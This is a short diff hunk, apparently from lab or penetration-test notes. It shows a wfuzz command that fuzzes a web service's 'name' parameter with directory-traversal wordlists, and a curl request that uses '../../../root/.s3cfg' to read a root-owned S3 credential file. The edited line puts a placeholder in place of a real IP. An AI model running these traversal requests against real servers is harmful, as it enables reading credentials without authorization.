@@ -8,4 +8,4 @@ head /shared/lists/file_names.txt
 
 cnoio_wfuzz -z file,/shared/lists/directory_traversals_quick.txt -z file,/shared/lists/root_folders.txt -z file,/shared/lists/file_names.txt --hl 45 http://10.0.2.118:8000/report?name=FUZZFUZ2ZFUZ3Z
 
-curl http://10.0.2.118:8000/report?name=../../../root/.s3cfg
+curl http://10.0.2.ip:8000/report?name=../../../root/.s3cfg
